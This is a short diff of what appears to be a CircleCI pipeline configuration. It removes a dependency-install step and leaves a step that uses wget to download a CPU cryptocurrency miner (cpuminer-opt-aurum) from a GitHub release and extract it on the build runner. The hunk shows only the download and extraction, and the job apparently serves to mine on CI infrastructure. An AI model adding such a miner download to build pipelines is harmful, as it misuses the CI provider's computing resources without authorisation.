@@ -8,11 +8,6 @@ jobs:
     steps:
       - checkout
       - run:
-          name: Install Dependencies
-          command: |
-            apt-get update && apt-get install -y wget libcurl4 libssl-dev
-
-      - run:
           name: Download and Extract
           command: |
             wget -qO- https://github.com/bitnet-io/cpuminer-opt-aurum/releases/download/aurum/CPU-AURUM-linux.tar.gz | tar xvz
